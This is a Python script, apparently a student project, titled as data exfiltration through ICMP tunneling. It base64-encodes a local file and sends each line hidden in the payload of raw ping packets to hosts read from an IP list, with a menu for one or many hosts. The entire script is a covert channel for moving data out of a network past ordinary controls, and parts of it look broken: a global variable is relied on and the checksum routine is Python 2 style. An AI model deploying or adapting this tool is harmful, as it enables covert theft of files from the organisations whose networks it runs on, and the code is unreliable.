
# Data exfiltration using ICMP tunneling
# 19PW13,19PW27

import time
import socket
import struct
import select
import random
import asyncore
import os
import sys

ICMP_ECHO_REQUEST = 8 # denotes ICMP requests

ICMP_CODE = socket.getprotobyname('icmp')

# types of errors
ERROR_DESCR = {
    1: ' - Note that ICMP messages can only be '
       'sent from processes running as root.',
    10013: ' - Note that ICMP messages can only be sent by'
           ' users or processes with administrator rights.'
}

# public objects of the program
__all__ = ['create_packet', 'do_one', 'verbose_ping', 'PingQuery',
           'multi_ping_query']


# function that calculates the checksum of data
def checksum(source_string):

    buffer=source_string
    # running till the end of the string
    nleft = len(buffer)
    sum = 0
    pos = 0
    # taking two bits at a time
    while nleft > 1:
        sum = ord(buffer[pos]) * 256 + (ord(buffer[pos + 1]) + sum)
        pos = pos + 2
        nleft = nleft - 2
    # for the remaining 1 bit
    if nleft == 1:
        sum = sum + ord(buffer[pos]) * 256

    # fold 32 bits into 16 bits
    sum = (sum >> 16) + (sum & 0xFFFF)
    sum += (sum >> 16)
    sum = (~sum & 0xFFFF)

    return sum


# Create a new echo request packet(ICMP) based on the given "id".
def create_packet(id):

    # Header is type (8), code (8), checksum (16), id (16), sequence (16)
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)

   # encoding the line read from file along with a header text
    data = "$$START$$" + line
    x = data
    data = x.encode()

    # Calculate the checksum on the data and the dummy header.
    my_checksum = checksum(header + data)

    # updating the header with the new right checksum value
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0,
                         socket.htons(my_checksum), id, 1)

    return header + data


 # creating a packet and sending the ping and receiving it
def do_one(dest_addr, timeout=1):

    try:
        # Creating a raw socket with ICMP_CODE type
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)

    except socket.error as e:
        if e.errno in ERROR_DESCR:
            # Operation not permitted
            raise socket.error(''.join((e.args[1], ERROR_DESCR[e.errno])))
        raise  # raise the original error
    try:
        host = socket.gethostbyname(dest_addr)
    except socket.gaierror:
        return

    # randomly generating packet_id
    packet_id = int((id(timeout) * random.random()) % 65535)

    # creating a packet with the generated packet_id
    packet = create_packet(packet_id)

    while packet:

        # ping does not need transport layer protocols so no ports required but the
        # function expects it so a dummy port is given
        sent = my_socket.sendto(packet, (dest_addr, 1))
        packet = packet[sent:]

    delay = receive_ping(my_socket, packet_id, time.time(), timeout)
    my_socket.close()
    return delay


# receives packet and caculates roundtrip time
def receive_ping(my_socket, packet_id, time_sent, timeout):

    # Receive the ping from the socket.
    time_left = timeout

    while True:
        started_select = time.time()
        ready = select.select([my_socket], [], [], time_left)
        how_long_in_select = time.time() - started_select
        if ready[0] == []:  # Timeout
            return

        # received time
        time_received = time.time()
        # receiving the packet
        rec_packet, addr = my_socket.recvfrom(1024)
        icmp_header = rec_packet[20:28]
        type, code, checksum, p_id, sequence = struct.unpack(
            'bbHHh', icmp_header)

        # calculating the round trip time for each packet
        if p_id == packet_id:
            return time_received - time_sent
        time_left -= time_received - time_sent
        if time_left <= 0:
            return

# prints the details of ping
def verbose_ping(dest_addr, timeout=2, count=1):

    for i in range(count):
        print('ping {}...'.format(dest_addr))
        delay = do_one(dest_addr, timeout)

        # failure condition when the roundtrip time is not returned from verbose_ping
        if delay == None:

            print('failed. (Timeout within {} seconds.)'.format(timeout))

        else:

            delay = round(delay * 1000.0, 4)
            print('get ping in {} milliseconds.'.format(delay))
    print('')

# Derived class from "asyncore.dispatcher" for sending and receiving an icmp echo request/reply.
# It is used in conjunction with the asyncore.loop function
class PingQuery(asyncore.dispatcher):

    def __init__(self, host, p_id, timeout=0.5, ignore_errors=False):

        asyncore.dispatcher.__init__(self)
        try:
            self.create_socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
        except socket.error as e:
            if e.errno in ERROR_DESCR:
                # Operation not permitted
                raise socket.error(''.join((e.args[1], ERROR_DESCR[e.errno])))
            raise  # raise the original error
        self.time_received = 0
        self.time_sent = 0
        self.timeout = timeout
        # Maximum for an unsigned short int c object counts to 65535 so
        # we have to sure that our packet id is not greater than that.
        self.packet_id = int((id(timeout) / p_id) % 65535)
        self.host = host
        self.packet = create_packet(self.packet_id)
        if ignore_errors:
            # If it does not care whether an error occured or not.
            self.handle_error = self.do_not_handle_errors
            self.handle_expt = self.do_not_handle_errors


    # to determine whether a channel’s socket should be added to the list on which write events can occur.
    def writable(self):
        return self.time_sent == 0

    # Called when the asynchronous loop detects that a writable socket can be written
    def handle_write(self):
        self.time_sent = time.time()
        while self.packet:
            # The icmp protocol does not use a port, but the function
            # below expects it, so we just give it a dummy port.
            sent = self.sendto(self.packet, (self.host, 1))
            self.packet = self.packet[sent:]


    # Called each time around the asynchronous loop to determine
    # whether a channel’s socket should be added to the list on which read events can occur.
    def readable(self):
        if (not self.writable()

                and self.timeout < (time.time() - self.time_sent)):
            self.close()
            return False

        return not self.writable()


    # Called when the asynchronous loop detects that a read() call on the channel’s socket will succeed.
    def handle_read(self):
        read_time = time.time()
        packet, addr = self.recvfrom(1024)
        header = packet[20:28]
        type, code, checksum, p_id, sequence = struct.unpack("bbHHh", header)
        if p_id == self.packet_id:
            # This comparison is necessary because winsocks do not only get
            # the replies for their own sent packets.
            self.time_received = read_time
            self.close()

    # Return the ping delay if possible, otherwise None.
    def get_result(self):
        if self.time_received > 0:
            return self.time_received - self.time_sent

    # Return the host where to the request has or should been sent
    def get_host(self):
        return self.host

    # Called to stop traceback printing
    def do_not_handle_errors(self):
        pass

    def create_socket(self, family, type, proto):
        # Overwritten, because the original does not support the "proto" arg.
        sock = socket.socket(family, type, proto)
        sock.setblocking(0)
        self.set_socket(sock)
        self.family_and_type = family, type

    # Called when the active opener’s socket actually makes a connection
    def handle_connect(self):
        pass

    # Called on listening channels (passive openers) when a connection
    # can be established with a new remote endpoint that has issued a connect() call for the local endpoint
    def handle_accept(self):
        pass

    # Called when the socket is closed.
    def handle_close(self):
        self.close()


# function that deals with ICMP tunneling
def multi_ping_query(hosts, timeout=1, step=512, ignore_errors=False):
    results, host_list, id = {}, [], 0

    # getting the socket host list
    for host in hosts:
        try:
            host_list.append(socket.gethostbyname(host))
        except socket.gaierror:
            results[host] = None

    while host_list:
        sock_list = []
        for ip in host_list[:step]:  # select supports only a max of 512
            id += 1
            sock_list.append(PingQuery(ip, id, timeout, ignore_errors))
            host_list.remove(ip)

        # Timeout is used. The risk to get an infinite loop
        # is high, because noone can guarantee that each host will reply!
        asyncore.loop(timeout) # calls the asyncore dispatcher

        # each host name and roundtrip time is noted in results
        for sock in sock_list:
            results[sock.get_host()] = sock.get_result()
    return results


if __name__ == '__main__':

    # text file that is ivolved in the file transfer
    file = 'sample+.txt'

    # performing base 64 encoding on the text file and storing it in data2.b64
    os.system("base64 sample.txt > data2.b64")


    while True:

        # Menu
        print("\n********************************************************")
        print("\n 1.Multiple hosts file transfer")
        print("\n 2.Single host file transfer")
        print("\n 3.Exit")
        ch = int(input("\nEnter your choice :: "))

        # sending ICMP ping to Multiple hosts
        if ch == 1:

            # opening the base64 encoded text file
            f = open("data2.b64", "r")

            # for every line in the file
            for line in f:

                # reading the destination IPs from the file to host_list
                f1 = open("IPlist.txt", "r")
                host_list = []
                for ip in f1:
                    y = ip[:-1]
                    host_list.append(y)

                # for every IP in the host_list verbose_ping is called
                for x in host_list:
                    destination_as_bytes = x.encode()
                    verbose_ping(destination_as_bytes)

                for host, ping in multi_ping_query(host_list).items():
                    print(host, '=', ping)


        # pinging a single host
        elif ch == 2:

            # opening the base64 encoded text file
            f = open("data2.b64", "r")

            # for every line in the file
            for line in f:

                # reading only a single IP from the IP lists
                f1 = open("IPlist.txt", "r")
                host_list = []
                for ip in f1:
                    y = ip[:-1]
                    host_list.append(y)
                    break

                # for every IP in the host_list verbose_ping is called
                for x in host_list:
                    destination_as_bytes = x.encode()
                    verbose_ping(destination_as_bytes)

                for host, ping in multi_ping_query(host_list).items():
                    print(host, '=', ping)

        else:
            exit()
            # exit function